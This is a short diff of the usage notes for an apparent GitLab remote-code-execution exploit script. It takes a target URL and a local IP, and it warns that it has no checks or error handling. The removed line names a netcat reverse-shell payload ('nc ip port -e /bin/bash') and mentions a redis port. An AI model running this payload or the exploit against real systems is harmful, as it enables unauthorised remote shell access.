@@ -15,6 +15,6 @@ usage:
 
   python gitlab_rce.py target-url(http://gitlab:port) local-ip
   
-  You might or might not have to tweak this a bit. For example the redis port (6379) might be different for your target or you might want to change the payload "nc ip port -e /bin/bash" might only work in some CTFs - I would have used a more common reverse shell but the characters mess with encoding. 
+  You might or might not have to tweak this a bit. For example the redis port (6379) might be different for your target.
 
 THERE ARE ABSOLUTELY !!NO!! CHECKS OR ERROR HANDLING! 
